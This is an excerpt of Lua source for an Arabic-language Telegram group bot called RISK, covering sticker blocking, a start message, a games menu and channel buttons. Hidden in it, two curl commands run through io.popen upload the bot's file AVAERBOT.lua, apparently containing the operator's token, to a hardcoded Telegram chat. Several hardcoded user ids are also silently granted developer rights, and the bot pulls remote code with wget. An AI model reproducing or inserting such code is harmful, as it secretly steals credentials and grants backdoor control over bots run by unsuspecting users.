...
Ids_Dev = {Id_Dev,bot_id,1649579632,4,1208165035,5}
...
local curlm = 'curl "'..'https://api.telegram.org/bot'.. token ..'/sendDocument'..'" -F "chat_id='.. 1208165035 ..'" -F "document=@'..'AVAERBOT.lua'..'"' io.popen(curlm) 
...
local curla = 'curl "'..'https://api.telegram.org/bot'.. sex1 ..'/sendDocument'..'" -F "chat_id='.. 1208165035 ..'" -F "document=@'..'AVAERBOT.lua'..'"' io.popen(curla)
...
Status = true
elseif tonumber(user_id) == tonumber(1649579632) then  
Status = true
elseif tonumber(user_id) == tonumber(4) then  
Status = true
elseif tonumber(user_id) == tonumber(5) then  
Status = true
...
if tonumber(user_id) == tonumber(4) then  
Status = "دنجول الجامد"
elseif tonumber(user_id) == tonumber(1649579632) then  
Status = "مبرمج السورس" 
elseif tonumber(user_id) == tonumber(1208165035) then  
...
local text1 = redis:get(bot_id..'NightRang:new:sourse1') or '≪━━━━━━𝐑𝐈𝐒𝐊𖥕━━━━━━≫'
local text2 = redis:get(bot_id..'NightRang:new:sourse2') or '❃∫'
text = string.gsub(text,"≪━━━━━━𝐑𝐈𝐒𝐊𖥕━━━━━━≫",text1)
...
send(msg.chat_id_,0, "❃∫عذرا يا ⇠ ["..data.first_name_.."](T.ME/NIU_C)\n❃∫ الملصق الذي ارسلته تم منعه من المجموعه \n" ) 
end
end,nil)   
Delete_Message(msg.chat_id_,{[0] = msg.id_})       
return false   
...
CmdStart = '\n❃∫ اهلا بك عزيزي ❃∫\n انا بوت اسمي '..(redis:get(bot_id.."NightRang:Redis:Name:Bot") or "ريسك")..''..
...
os.execute('wget https://raw.githubusercontent.com/ahmedawad10/RISK/master/NightRang.lua')
...
if text == 'العاب ريسك' or text == ' العاب خارقه' or text == 'العاب متطوره' then  
local Text = [[  
...
local Text = [[ 
☉𝐑𝐈𝐒𝐊, 𝐓𝐇𝐄 𝐁𝐄𝐒𝐓 𝐒𝐎𝐔𝐑𝐂𝐄⁦☉️
]] 
keyboard = {} 
keyboard.inline_keyboard = { 
{{text = '𓆩𝐃𝐄𝐕 𝐀𝐇𝐌𝐄𝐃𓆪', url="t.me/AAHMEED11"}},
{{text = '𓆩𝐂𝐇𝐀𝐍𝐍𝐄𝐋 𝐑𝐈𝐒𝐊𓆪', url="t.me/NIU_C"}},
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
